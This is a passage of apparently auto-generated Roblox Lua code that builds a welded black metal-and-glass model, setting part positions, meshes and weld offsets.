Weld83 = Instance.new("Weld")
Weld84 = Instance.new("Weld")
Weld85 = Instance.new("Weld")
Weld86 = Instance.new("Weld")
Weld87 = Instance.new("Weld")
Weld88 = Instance.new("Weld")
Weld89 = Instance.new("Weld")
Weld90 = Instance.new("Weld")
Weld91 = Instance.new("Weld")
Weld92 = Instance.new("Weld")
Weld93 = Instance.new("Weld")
Weld94 = Instance.new("Weld")
Weld95 = Instance.new("Weld")
Weld96 = Instance.new("Weld")
Weld97 = Instance.new("Weld")
Weld98 = Instance.new("Weld")
Weld99 = Instance.new("Weld")
Weld100 = Instance.new("Weld")
Weld101 = Instance.new("Weld")
Weld102 = Instance.new("Weld")
Weld103 = Instance.new("Weld")
Weld104 = Instance.new("Weld")
Weld105 = Instance.new("Weld")
Weld106 = Instance.new("Weld")
Weld107 = Instance.new("Weld")
Weld108 = Instance.new("Weld")
Weld109 = Instance.new("Weld")
Weld110 = Instance.new("Weld")
Weld111 = Instance.new("Weld")
Weld112 = Instance.new("Weld")
Weld113 = Instance.new("Weld")
Weld114 = Instance.new("Weld")
Weld115 = Instance.new("Weld")
Weld116 = Instance.new("Weld")
Weld117 = Instance.new("Weld")
Weld118 = Instance.new("Weld")
Weld119 = Instance.new("Weld")
Weld120 = Instance.new("Weld")
Weld121 = Instance.new("Weld")
Weld122 = Instance.new("Weld")
Weld123 = Instance.new("Weld")
Weld124 = Instance.new("Weld")
Weld125 = Instance.new("Weld")
Weld126 = Instance.new("Weld")
Weld127 = Instance.new("Weld")
Weld128 = Instance.new("Weld")
Weld129 = Instance.new("Weld")
Weld130 = Instance.new("Weld")
Weld131 = Instance.new("Weld")
Weld132 = Instance.new("Weld")
Weld133 = Instance.new("Weld")
Weld134 = Instance.new("Weld")
Weld135 = Instance.new("Weld")
Weld136 = Instance.new("Weld")
Weld137 = Instance.new("Weld")
Weld138 = Instance.new("Weld")
Weld139 = Instance.new("Weld")
Weld140 = Instance.new("Weld")
Weld141 = Instance.new("Weld")
Weld142 = Instance.new("Weld")
Weld143 = Instance.new("Weld")
Weld144 = Instance.new("Weld")
Weld145 = Instance.new("Weld")
Weld146 = Instance.new("Weld")
Weld147 = Instance.new("Weld")
Weld148 = Instance.new("Weld")
Weld149 = Instance.new("Weld")
Weld150 = Instance.new("Weld")
Weld151 = Instance.new("Weld")
Weld152 = Instance.new("Weld")
Weld153 = Instance.new("Weld")
Weld154 = Instance.new("Weld")
Weld155 = Instance.new("Weld")
Weld156 = Instance.new("Weld")
Weld157 = Instance.new("Weld")
Weld158 = Instance.new("Weld")
Weld159 = Instance.new("Weld")
Weld160 = Instance.new("Weld")
Weld161 = Instance.new("Weld")
Weld162 = Instance.new("Weld")
Part163 = Instance.new("Part")
SpecialMesh164 = Instance.new("SpecialMesh")
Part165 = Instance.new("Part")
SpecialMesh166 = Instance.new("SpecialMesh")
Part167 = Instance.new("Part")
SpecialMesh168 = Instance.new("SpecialMesh")
Part169 = Instance.new("Part")
SpecialMesh170 = Instance.new("SpecialMesh")
Part171 = Instance.new("Part")
SpecialMesh172 = Instance.new("SpecialMesh")
Part173 = Instance.new("Part")
SpecialMesh174 = Instance.new("SpecialMesh")
Part175 = Instance.new("Part")
SpecialMesh176 = Instance.new("SpecialMesh")
Part177 = Instance.new("Part")
SpecialMesh178 = Instance.new("SpecialMesh")
Part179 = Instance.new("Part")
SpecialMesh180 = Instance.new("SpecialMesh")
Part181 = Instance.new("Part")
SpecialMesh182 = Instance.new("SpecialMesh")
Part183 = Instance.new("Part")
SpecialMesh184 = Instance.new("SpecialMesh")
Part185 = Instance.new("Part")
SpecialMesh186 = Instance.new("SpecialMesh")
Part187 = Instance.new("Part")
SpecialMesh188 = Instance.new("SpecialMesh")
Part189 = Instance.new("Part")
SpecialMesh190 = Instance.new("SpecialMesh")
Part191 = Instance.new("Part")
SpecialMesh192 = Instance.new("SpecialMesh")
Part193 = Instance.new("Part")
SpecialMesh194 = Instance.new("SpecialMesh")
Part195 = Instance.new("Part")
SpecialMesh196 = Instance.new("SpecialMesh")
Part197 = Instance.new("Part")
SpecialMesh198 = Instance.new("SpecialMesh")
Part199 = Instance.new("Part")
SpecialMesh200 = Instance.new("SpecialMesh")
Part201 = Instance.new("Part")
SpecialMesh202 = Instance.new("SpecialMesh")
Part203 = Instance.new("Part")
SpecialMesh204 = Instance.new("SpecialMesh")
Part205 = Instance.new("Part")
SpecialMesh206 = Instance.new("SpecialMesh")
Part207 = Instance.new("Part")
SpecialMesh208 = Instance.new("SpecialMesh")
Part209 = Instance.new("Part")
SpecialMesh210 = Instance.new("SpecialMesh")
Part211 = Instance.new("Part")
SpecialMesh212 = Instance.new("SpecialMesh")
Part213 = Instance.new("Part")
SpecialMesh214 = Instance.new("SpecialMesh")
Part215 = Instance.new("Part")
SpecialMesh216 = Instance.new("SpecialMesh")
Part217 = Instance.new("Part")
SpecialMesh218 = Instance.new("SpecialMesh")
Part219 = Instance.new("Part")
SpecialMesh220 = Instance.new("SpecialMesh")
Part221 = Instance.new("Part")
SpecialMesh222 = Instance.new("SpecialMesh")
Part223 = Instance.new("Part")
SpecialMesh224 = Instance.new("SpecialMesh")
Part225 = Instance.new("Part")
SpecialMesh226 = Instance.new("SpecialMesh")
Part227 = Instance.new("Part")
SpecialMesh228 = Instance.new("SpecialMesh")
Part229 = Instance.new("Part")
SpecialMesh230 = Instance.new("SpecialMesh")
Part231 = Instance.new("Part")
SpecialMesh232 = Instance.new("SpecialMesh")
Part233 = Instance.new("Part")
SpecialMesh234 = Instance.new("SpecialMesh")
Part235 = Instance.new("Part")
SpecialMesh236 = Instance.new("SpecialMesh")
Part237 = Instance.new("Part")
SpecialMesh238 = Instance.new("SpecialMesh")
Part239 = Instance.new("Part")
SpecialMesh240 = Instance.new("SpecialMesh")
Part241 = Instance.new("Part")
SpecialMesh242 = Instance.new("SpecialMesh")
Part243 = Instance.new("Part")
SpecialMesh244 = Instance.new("SpecialMesh")
Part245 = Instance.new("Part")
SpecialMesh246 = Instance.new("SpecialMesh")
Part247 = Instance.new("Part")
SpecialMesh248 = Instance.new("SpecialMesh")
Part249 = Instance.new("Part")
SpecialMesh250 = Instance.new("SpecialMesh")
Part251 = Instance.new("Part")
SpecialMesh252 = Instance.new("SpecialMesh")
Part253 = Instance.new("Part")
SpecialMesh254 = Instance.new("SpecialMesh")
Part255 = Instance.new("Part")
SpecialMesh256 = Instance.new("SpecialMesh")
Part257 = Instance.new("Part")
SpecialMesh258 = Instance.new("SpecialMesh")
Part259 = Instance.new("Part")
SpecialMesh260 = Instance.new("SpecialMesh")
Part261 = Instance.new("Part")
SpecialMesh262 = Instance.new("SpecialMesh")
Part263 = Instance.new("Part")
SpecialMesh264 = Instance.new("SpecialMesh")
Part265 = Instance.new("Part")
SpecialMesh266 = Instance.new("SpecialMesh")
Part267 = Instance.new("Part")
SpecialMesh268 = Instance.new("SpecialMesh")
Part269 = Instance.new("Part")
SpecialMesh270 = Instance.new("SpecialMesh")
Part271 = Instance.new("Part")
SpecialMesh272 = Instance.new("SpecialMesh")
Part273 = Instance.new("Part")
SpecialMesh274 = Instance.new("SpecialMesh")
Part275 = Instance.new("Part")
SpecialMesh276 = Instance.new("SpecialMesh")
Part277 = Instance.new("Part")
SpecialMesh278 = Instance.new("SpecialMesh")
Part279 = Instance.new("Part")
SpecialMesh280 = Instance.new("SpecialMesh")
Part281 = Instance.new("Part")
SpecialMesh282 = Instance.new("SpecialMesh")
Part283 = Instance.new("Part")
SpecialMesh284 = Instance.new("SpecialMesh")
Part285 = Instance.new("Part")
SpecialMesh286 = Instance.new("SpecialMesh")
Part287 = Instance.new("Part")
SpecialMesh288 = Instance.new("SpecialMesh")
Part289 = Instance.new("Part")
SpecialMesh290 = Instance.new("SpecialMesh")
Part291 = Instance.new("Part")
SpecialMesh292 = Instance.new("SpecialMesh")
Part293 = Instance.new("Part")
SpecialMesh294 = Instance.new("SpecialMesh")
Part295 = Instance.new("Part")
SpecialMesh296 = Instance.new("SpecialMesh")
Part297 = Instance.new("Part")
SpecialMesh298 = Instance.new("SpecialMesh")
Part299 = Instance.new("Part")
SpecialMesh300 = Instance.new("SpecialMesh")
Part301 = Instance.new("Part")
SpecialMesh302 = Instance.new("SpecialMesh")
Part303 = Instance.new("Part")
SpecialMesh304 = Instance.new("SpecialMesh")
Part305 = Instance.new("Part")
SpecialMesh306 = Instance.new("SpecialMesh")
Part307 = Instance.new("Part")
SpecialMesh308 = Instance.new("SpecialMesh")
Part309 = Instance.new("Part")
SpecialMesh310 = Instance.new("SpecialMesh")
Part311 = Instance.new("Part")
SpecialMesh312 = Instance.new("SpecialMesh")
Part313 = Instance.new("Part")
SpecialMesh314 = Instance.new("SpecialMesh")
Part315 = Instance.new("Part")
SpecialMesh316 = Instance.new("SpecialMesh")
Part317 = Instance.new("Part")
SpecialMesh318 = Instance.new("SpecialMesh")
Part319 = Instance.new("Part")
SpecialMesh320 = Instance.new("SpecialMesh")
Part321 = Instance.new("Part")
SpecialMesh322 = Instance.new("SpecialMesh")
Part323 = Instance.new("Part")
SpecialMesh324 = Instance.new("SpecialMesh")
Part325 = Instance.new("Part")
SpecialMesh326 = Instance.new("SpecialMesh")
Part327 = Instance.new("Part")
SpecialMesh328 = Instance.new("SpecialMesh")
Part329 = Instance.new("Part")
SpecialMesh330 = Instance.new("SpecialMesh")
Part331 = Instance.new("Part")
SpecialMesh332 = Instance.new("SpecialMesh")
Part333 = Instance.new("Part")
SpecialMesh334 = Instance.new("SpecialMesh")
Part335 = Instance.new("Part")
SpecialMesh336 = Instance.new("SpecialMesh")
Part337 = Instance.new("Part")
SpecialMesh338 = Instance.new("SpecialMesh")
Part339 = Instance.new("Part")
SpecialMesh340 = Instance.new("SpecialMesh")
Part341 = Instance.new("Part")
SpecialMesh342 = Instance.new("SpecialMesh")
Part343 = Instance.new("Part")
SpecialMesh344 = Instance.new("SpecialMesh")
Part345 = Instance.new("Part")
SpecialMesh346 = Instance.new("SpecialMesh")
Part347 = Instance.new("Part")
SpecialMesh348 = Instance.new("SpecialMesh")
Part349 = Instance.new("Part")
SpecialMesh350 = Instance.new("SpecialMesh")
Part351 = Instance.new("Part")
SpecialMesh352 = Instance.new("SpecialMesh")
Part353 = Instance.new("Part")
SpecialMesh354 = Instance.new("SpecialMesh")
Part355 = Instance.new("Part")
SpecialMesh356 = Instance.new("SpecialMesh")
Part357 = Instance.new("Part")
SpecialMesh358 = Instance.new("SpecialMesh")
Part359 = Instance.new("Part")
SpecialMesh360 = Instance.new("SpecialMesh")
Part361 = Instance.new("Part")
SpecialMesh362 = Instance.new("SpecialMesh")
Part363 = Instance.new("Part")
SpecialMesh364 = Instance.new("SpecialMesh")
Part365 = Instance.new("Part")
SpecialMesh366 = Instance.new("SpecialMesh")
Part367 = Instance.new("Part")
SpecialMesh368 = Instance.new("SpecialMesh")
Part369 = Instance.new("Part")
SpecialMesh370 = Instance.new("SpecialMesh")
Part371 = Instance.new("Part")
SpecialMesh372 = Instance.new("SpecialMesh")
Part373 = Instance.new("Part")
SpecialMesh374 = Instance.new("SpecialMesh")
Part375 = Instance.new("Part")
SpecialMesh376 = Instance.new("SpecialMesh")
Part377 = Instance.new("Part")
SpecialMesh378 = Instance.new("SpecialMesh")
Part379 = Instance.new("Part")
SpecialMesh380 = Instance.new("SpecialMesh")
Part381 = Instance.new("Part")
SpecialMesh382 = Instance.new("SpecialMesh")
Part383 = Instance.new("Part")
SpecialMesh384 = Instance.new("SpecialMesh")
Part385 = Instance.new("Part")
SpecialMesh386 = Instance.new("SpecialMesh")
Part387 = Instance.new("Part")
SpecialMesh388 = Instance.new("SpecialMesh")
Part389 = Instance.new("Part")
SpecialMesh390 = Instance.new("SpecialMesh")
Part391 = Instance.new("Part")
SpecialMesh392 = Instance.new("SpecialMesh")
Part393 = Instance.new("Part")
SpecialMesh394 = Instance.new("SpecialMesh")
Part395 = Instance.new("Part")
SpecialMesh396 = Instance.new("SpecialMesh")
Part397 = Instance.new("Part")
SpecialMesh398 = Instance.new("SpecialMesh")
Part399 = Instance.new("Part")
SpecialMesh400 = Instance.new("SpecialMesh")
Part401 = Instance.new("Part")
SpecialMesh402 = Instance.new("SpecialMesh")
Part403 = Instance.new("Part")
SpecialMesh404 = Instance.new("SpecialMesh")
Part405 = Instance.new("Part")
SpecialMesh406 = Instance.new("SpecialMesh")
Part407 = Instance.new("Part")
SpecialMesh408 = Instance.new("SpecialMesh")
Part409 = Instance.new("Part")
SpecialMesh410 = Instance.new("SpecialMesh")
Part411 = Instance.new("Part")
SpecialMesh412 = Instance.new("SpecialMesh")
Part413 = Instance.new("Part")
SpecialMesh414 = Instance.new("SpecialMesh")
Part415 = Instance.new("Part")
SpecialMesh416 = Instance.new("SpecialMesh")
Part417 = Instance.new("Part")
SpecialMesh418 = Instance.new("SpecialMesh")
Part419 = Instance.new("Part")
SpecialMesh420 = Instance.new("SpecialMesh")
Part421 = Instance.new("Part")
SpecialMesh422 = Instance.new("SpecialMesh")
Part423 = Instance.new("Part")
SpecialMesh424 = Instance.new("SpecialMesh")
Part425 = Instance.new("Part")
SpecialMesh426 = Instance.new("SpecialMesh")
Part427 = Instance.new("Part")
SpecialMesh428 = Instance.new("SpecialMesh")
Part429 = Instance.new("Part")
SpecialMesh430 = Instance.new("SpecialMesh")
Part431 = Instance.new("Part")
SpecialMesh432 = Instance.new("SpecialMesh")
Part433 = Instance.new("Part")
SpecialMesh434 = Instance.new("SpecialMesh")
Part435 = Instance.new("Part")
SpecialMesh436 = Instance.new("SpecialMesh")
Part437 = Instance.new("Part")
SpecialMesh438 = Instance.new("SpecialMesh")
Part439 = Instance.new("Part")
SpecialMesh440 = Instance.new("SpecialMesh")
Part441 = Instance.new("Part")
SpecialMesh442 = Instance.new("SpecialMesh")
Part443 = Instance.new("Part")
SpecialMesh444 = Instance.new("SpecialMesh")
Part445 = Instance.new("Part")
SpecialMesh446 = Instance.new("SpecialMesh")
Part447 = Instance.new("Part")
SpecialMesh448 = Instance.new("SpecialMesh")
Part449 = Instance.new("Part")
SpecialMesh450 = Instance.new("SpecialMesh")
Part451 = Instance.new("Part")
SpecialMesh452 = Instance.new("SpecialMesh")
Part453 = Instance.new("Part")
SpecialMesh454 = Instance.new("SpecialMesh")
Part455 = Instance.new("Part")
SpecialMesh456 = Instance.new("SpecialMesh")
Part457 = Instance.new("Part")
SpecialMesh458 = Instance.new("SpecialMesh")
Part459 = Instance.new("Part")
SpecialMesh460 = Instance.new("SpecialMesh")
Part461 = Instance.new("Part")
SpecialMesh462 = Instance.new("SpecialMesh")
Part463 = Instance.new("Part")
SpecialMesh464 = Instance.new("SpecialMesh")
Part465 = Instance.new("Part")
SpecialMesh466 = Instance.new("SpecialMesh")
Part467 = Instance.new("Part")
SpecialMesh468 = Instance.new("SpecialMesh")
Part469 = Instance.new("Part")
SpecialMesh470 = Instance.new("SpecialMesh")
Part471 = Instance.new("Part")
SpecialMesh472 = Instance.new("SpecialMesh")
Part473 = Instance.new("Part")
SpecialMesh474 = Instance.new("SpecialMesh")
Part475 = Instance.new("Part")
SpecialMesh476 = Instance.new("SpecialMesh")
Model0.Parent = mas
Part1.Parent = Model0
Part1.CFrame = CFrame.new(-0.612978518, 3.52787709, -14.4877329, 0.999985635, -0.00299202278, 0.00444748998, 0.00513700023, 0.297964603, -0.95456326, 0.00153088011, 0.95457232, 0.297975689)
Part1.Orientation = Vector3.new(72.659996, 0.859999955, 0.98999995)
Part1.Position = Vector3.new(-0.612978518, 3.52787709, -14.4877329)
Part1.Rotation = Vector3.new(72.659996, 0.25, 0.170000002)
Part1.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part1.Velocity = Vector3.new(1.29135582e-08, 0.00246586069, 1.6969787e-07)
Part1.Size = Vector3.new(0.275000006, 0.22512494, 0.42337501)
Part1.Anchored = true
Part1.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part1.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part1.BrickColor = BrickColor.new("Really black")
Part1.CanCollide = false
Part1.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part1.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part1.Material = Enum.Material.Metal
Part1.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part1.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part1.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part1.brickColor = BrickColor.new("Really black")
SpecialMesh2.Parent = Part1
SpecialMesh2.Scale = Vector3.new(0.400000006, 1, 0.5)
SpecialMesh2.MeshType = Enum.MeshType.Brick
Part3.Parent = Model0
Part3.CFrame = CFrame.new(-0.608517408, 2.57421446, -14.2038746, 0.999985635, 0.00162795268, -0.00510686403, 0.0051367972, -0.0189460143, 0.999807417, 0.00153088395, -0.999819279, -0.0189541057)
Part3.Orientation = Vector3.new(-88.8799973, -164.919998, 164.830002)
Part3.Position = Vector3.new(-0.608517408, 2.57421446, -14.2038746)
Part3.Rotation = Vector3.new(-91.0899963, -0.289999992, -0.0899999961)
Part3.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part3.Velocity = Vector3.new(1.6413172e-07, 0.00246645301, 2.15686623e-06)
Part3.Size = Vector3.new(0.275000006, 0.315999985, 0.303375006)
Part3.Anchored = true
Part3.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part3.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part3.BrickColor = BrickColor.new("Really black")
Part3.CanCollide = false
Part3.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part3.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part3.Material = Enum.Material.Glass
Part3.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part3.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part3.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part3.brickColor = BrickColor.new("Really black")
SpecialMesh4.Parent = Part3
SpecialMesh4.Scale = Vector3.new(0.5, 1, 0.5)
SpecialMesh4.MeshType = Enum.MeshType.Wedge
Weld5.Name = "BTWeld"
Weld5.Parent = Part3
Weld5.C1 = CFrame.new(1.78813934e-06, -0.442868233, -0.256871939, -1, 2.08499841e-07, 2.3712164e-07, -2.08849087e-07, -1.00000024, 0, 2.39566361e-07, 1.86264515e-09, 1.00000024)
Weld5.Part0 = Part3
Weld5.Part1 = Part441
Weld5.part1 = Part441
Weld6.Name = "BTWeld"
Weld6.Parent = Part3
Weld6.C1 = CFrame.new(2.8014183e-06, 0.12912178, 0.434119463, -1, -2.32830644e-10, 3.05299181e-08, 2.32830644e-10, 1.00000024, 1.80676579e-07, -3.2619937e-08, 1.76951289e-07, -1.00000024)
Weld6.Part0 = Part3
Weld6.Part1 = Part323
Weld6.part1 = Part323
Weld7.Name = "BTWeld"
Weld7.Parent = Part3
Weld7.C1 = CFrame.new(-3.09944153e-06, -0.192704201, -0.62885952, 1, 8.96397978e-08, 1.20697223e-07, -8.91741365e-08, 1.00000024, 1.78813934e-07, -1.1825432e-07, -1.78813934e-07, 1.00000024)
Weld7.Part0 = Part3
Weld7.Part1 = Part371
Weld7.part1 = Part371
Weld8.Name = "BTWeld"
Weld8.Parent = Part3
Weld8.C1 = CFrame.new(-2.86102295e-06, 0.0544996262, -0.312496185, 1, 2.32830644e-10, 1.14778231e-09, 2.32830644e-10, 1.00000024, 1.86264515e-09, 1.14778231e-09, 1.86264515e-09, 1.00000024)
Weld8.Part0 = Part3
Weld8.Part1 = Part167
Weld8.part1 = Part167
Weld9.Name = "BTWeld"
Weld9.Parent = Part3
Weld9.C1 = CFrame.new(3.63588333e-06, -2.63571262, -0.638117313, -1, 1.18976459e-07, 3.0064075e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.02987246e-07, -5.77419996e-08, 1.00000024)
Weld9.Part0 = Part3
Weld9.Part1 = Part177
Weld9.part1 = Part177
Weld10.Name = "BTWeld"
Weld10.Parent = Part3
Weld10.C1 = CFrame.new(-2.98023224e-06, -0.077252388, -0.223499537, 1, 2.32830644e-10, 1.14778231e-09, 2.32830644e-10, 1.00000024, 1.86264515e-09, 1.14778231e-09, 1.86264515e-09, 1.00000024)
Weld10.Part0 = Part3
Weld10.Part1 = Part277
Weld10.part1 = Part277
Weld11.Name = "BTWeld"
Weld11.Parent = Part3
Weld11.C1 = CFrame.new(1.90734863e-06, -0.629117966, -0.531242609, -1, 1.18976459e-07, 3.0064075e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.02987246e-07, -5.77419996e-08, 1.00000024)
Weld11.Part0 = Part3
Weld11.Part1 = Part427
Weld11.part1 = Part427
Weld12.Name = "BTWeld"
Weld12.Parent = Part3
Weld12.C1 = CFrame.new(3.87430191e-06, -1.56084347, -0.606865883, -1, 2.08499841e-07, 1.81222276e-07, -2.08849087e-07, -1.00000024, 0, 1.83687007e-07, 1.86264515e-09, 1.00000024)
Weld12.Part0 = Part3
Weld12.Part1 = Part209
Weld12.part1 = Part209
Weld13.Name = "BTWeld"
Weld13.Parent = Part3
Weld13.C1 = CFrame.new(-1.66893005e-06, -0.394741058, 0.453120232, 1, -1.19092874e-07, -2.68964868e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, -2.71322278e-07, 5.77419996e-08, -1.00000024)
Weld13.Part0 = Part3
Weld13.Part1 = Part265
Weld13.part1 = Part265
Weld14.Name = "BTWeld"
Weld14.Parent = Part3
Weld14.C1 = CFrame.new(-3.51667404e-06, -3.62178516, 0.128079414, 1, 2.32830644e-10, -2.82076144e-07, 4.92436811e-08, -0.984807968, 0.173648342, -2.7945498e-07, -0.173648342, -0.984807968)
Weld14.Part0 = Part3
Weld14.Part1 = Part445
Weld14.part1 = Part445
Weld15.Name = "BTWeld"
Weld15.Parent = Part3
Weld15.C1 = CFrame.new(1.7285347e-06, -0.568753242, -0.743589878, -1, 1.18976459e-07, 3.28123861e-07, -1.1944212e-07, -1.00000024, -8.94069672e-08, 3.30041075e-07, -8.7544322e-08, 1.00000024)
Weld15.Part0 = Part3
Weld15.Part1 = Part175
Weld15.part1 = Part175
Weld16.Name = "BTWeld"
Weld16.Parent = Part3
Weld16.C1 = CFrame.new(-0.568752289, -0.0312482715, 1.24358273, -5.98374754e-08, -1.00000024, 0, -1, 5.93718141e-08, 3.27925591e-07, -3.30370312e-07, -1.86264515e-09, -1.00000024)
Weld16.Part0 = Part3
Weld16.Part1 = Part433
Weld16.part1 = Part433
Weld17.Name = "BTWeld"
Weld17.Parent = Part3
Weld17.C1 = CFrame.new(1.7285347e-06, -0.568753242, -0.743589878, -1, 1.18976459e-07, 3.28123861e-07, -1.1944212e-07, -1.00000024, -8.94069672e-08, 3.30041075e-07, -8.7544322e-08, 1.00000024)
Weld17.Part0 = Part3
Weld17.Part1 = Part417
Weld17.part1 = Part417
Weld18.Name = "BTWeld"
Weld18.Parent = Part3
Weld18.C1 = CFrame.new(-3.09944153e-06, -0.364574432, -0.628859282, 1, 8.96397978e-08, 1.20697223e-07, -8.91741365e-08, 1.00000024, 1.78813934e-07, -1.1825432e-07, -1.78813934e-07, 1.00000024)
Weld18.Part0 = Part3
Weld18.Part1 = Part295
Weld18.part1 = Part295
Weld19.Name = "BTWeld"
Weld19.Parent = Part3
Weld19.C1 = CFrame.new(3.93390656e-06, -3.33387375, 1.42912102, -1, 2.08499841e-07, 7.08205334e-08, -1.35507435e-07, -0.838670611, 0.544639409, 1.75263267e-07, 0.544639468, 0.838670611)
Weld19.Part0 = Part3
Weld19.Part1 = Part165
Weld19.part1 = Part165
Weld20.Name = "BTWeld"
Weld20.Parent = Part3
Weld20.C1 = CFrame.new(1.78813934e-07, -3.38045502, 0.755048752, 1, 2.32830644e-10, -2.6903399e-07, -2.32830644e-10, -1.00000024, 8.7544322e-08, -2.71093086e-07, -9.12696123e-08, -1.00000024)
Weld20.Part0 = Part3
Weld20.Part1 = Part315
Weld20.part1 = Part315
Weld21.Name = "BTWeld"
Weld21.Parent = Part3
Weld21.C1 = CFrame.new(0.522247314, -0.031253159, 0.449784279, 2.578774e-06, -0.500000775, -0.866025329, 1, 2.96742655e-06, 1.26622399e-06, 1.93726737e-06, -0.866025329, 0.500000715)
Weld21.Part0 = Part3
Weld21.Part1 = Part457
Weld21.part1 = Part457
Weld22.Name = "BTWeld"
Weld22.Parent = Part3
Weld22.C1 = CFrame.new(-3.03983688e-06, -0.26757431, -0.628857851, 1, 8.96397978e-08, 1.20697223e-07, -8.91741365e-08, 1.00000024, 1.78813934e-07, -1.1825432e-07, -1.78813934e-07, 1.00000024)
Weld22.Part0 = Part3
Weld22.Part1 = Part363
Weld22.part1 = Part363
Weld23.Name = "BTWeld"
Weld23.Parent = Part3
Weld23.C1 = CFrame.new(-3.03983688e-06, 0.579193592, -0.519788742, 1, 2.08732672e-07, 7.35781214e-08, -9.66247171e-08, 0.707106471, -0.707107365, -1.97673216e-07, 0.707107365, 0.707106471)
Weld23.Part0 = Part3
Weld23.Part1 = Part429
Weld23.part1 = Part429
Weld24.Name = "BTWeld"
Weld24.Parent = Part3
Weld24.C1 = CFrame.new(3.57627869e-06, -2.7432127, -0.596743584, -1, 1.18976459e-07, 3.0064075e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.02987246e-07, -5.77419996e-08, 1.00000024)
Weld24.Part0 = Part3
Weld24.Part1 = Part253
Weld24.part1 = Part253
Weld25.Name = "BTWeld"
Weld25.Parent = Part3
Weld25.C1 = CFrame.new(-5.96046448e-08, -0.0365514755, -0.0244483948, -1, 2.08383426e-07, 3.34477591e-07, -3.4889672e-07, -0.866025686, -0.49999994, 1.87254045e-07, -0.499999881, 0.866025686)
Weld25.Part0 = Part3
Weld25.Part1 = Part383
Weld25.part1 = Part383
Weld26.Name = "BTWeld"
Weld26.Parent = Part3
Weld26.C1 = CFrame.new(0.0437097549, -0.0312481523, 1.49426508, -1.02329068e-07, -0.707107306, -0.707106531, -1, -1.1047814e-07, 2.52499376e-07, -2.57976353e-07, 0.70710659, -0.707107306)
Weld26.Part0 = Part3
Weld26.Part1 = Part289
Weld26.part1 = Part289
Weld27.Name = "BTWeld"
Weld27.Parent = Part3
Weld27.C1 = CFrame.new(-0.390325546, -0.0312492251, 0.188101292, 1.53668225e-07, 0.866025686, 0.5, -1, 1.49011612e-07, 4.73319233e-08, -3.19560058e-08, -0.49999994, 0.866025686)
Weld27.Part0 = Part3
Weld27.Part1 = Part465
Weld27.part1 = Part465
Weld28.Name = "BTWeld"
Weld28.Parent = Part3
Weld28.C1 = CFrame.new(3.69548798e-06, 1.39622211, 0.606865406, -1, -8.95233825e-08, 3.02316039e-08, -8.91741365e-08, 1.00000024, -8.94069672e-08, -3.26745067e-08, -9.12696123e-08, -1.00000024)
Weld28.Part0 = Part3
Weld28.Part1 = Part325
Weld28.part1 = Part325
Weld29.Name = "BTWeld"
Weld29.Parent = Part3
Weld29.C1 = CFrame.new(-3.03983688e-06, -0.0283536911, -0.593729019, 1, 8.95233825e-08, 4.61641321e-08, -6.54254109e-08, 0.923879802, -0.382683307, -7.52625056e-08, 0.382683337, 0.923879921)
Weld29.Part0 = Part3
Weld29.Part1 = Part435
Weld29.part1 = Part435
Weld30.Name = "BTWeld"
Weld30.Parent = Part3
Weld30.C1 = CFrame.new(-2.98023224e-06, 0.0857448578, -0.331493855, 1, 2.32830644e-10, 1.14778231e-09, 2.32830644e-10, 1.00000024, 1.86264515e-09, 1.14778231e-09, 1.86264515e-09, 1.00000024)
Weld30.Part0 = Part3
Weld30.Part1 = Part297
Weld30.part1 = Part297
Weld31.Name = "BTWeld"
Weld31.Parent = Part3
Weld31.C1 = CFrame.new(2.98023224e-06, 0.0857439041, 0.434119463, -1, -2.32830644e-10, -8.87230271e-08, 2.32830644e-10, 1.00000024, 1.86264515e-09, 8.63965397e-08, -1.86264515e-09, -1.00000024)
Weld31.Part0 = Part3
Weld31.Part1 = Part403
Weld31.part1 = Part403
Weld32.Name = "BTWeld"
Weld32.Parent = Part3
Weld32.C1 = CFrame.new(3.69548798e-06, -1.12822342, -0.591116667, -1, 1.18976459e-07, 3.0064075e-07, -1.19325705e-07, -1.00000024, -5.96046448e-08, 3.02987246e-07, -5.77419996e-08, 1.00000024)
Weld32.Part0 = Part3
Weld32.Part1 = Part317
Weld32.part1 = Part317
Weld33.Name = "BTWeld"
Weld33.Parent = Part3
Weld33.C1 = CFrame.new(-3.57627869e-06, 1.17320824, 0.736830235, 1, -1.19092874e-07, 2.04781827e-07, -1.19325705e-07, -1.00000024, 2.68220901e-07, 2.03222953e-07, -2.68220901e-07, -1.00000024)
Weld33.Part0 = Part3
Weld33.Part1 = Part171
Weld33.part1 = Part171
Weld34.Name = "BTWeld"
Weld34.Parent = Part3
Weld34.C1 = CFrame.new(3.51667404e-06, -2.70561504, -1.06026649, -1, 1.18976459e-07, 3.69582267e-07, -1.82189979e-07, -0.984807968, -0.173648283, 3.45506123e-07, -0.173648298, 0.984807968)
Weld34.Part0 = Part3
Weld34.Part1 = Part251
Weld34.part1 = Part251
Weld35.Name = "BTWeld"
Weld35.Parent = Part3
Weld35.C1 = CFrame.new(0.568753242, -0.0312516689, 1.24358273, 1.1944212e-07, 1.00000024, 0, 1, -1.18976459e-07, -3.28123861e-07, -3.30370312e-07, -1.86264515e-09, -1.00000024)
Weld35.Part0 = Part3
Weld35.Part1 = Part443
Weld35.part1 = Part443
Weld36.Name = "BTWeld"
Weld36.Parent = Part3
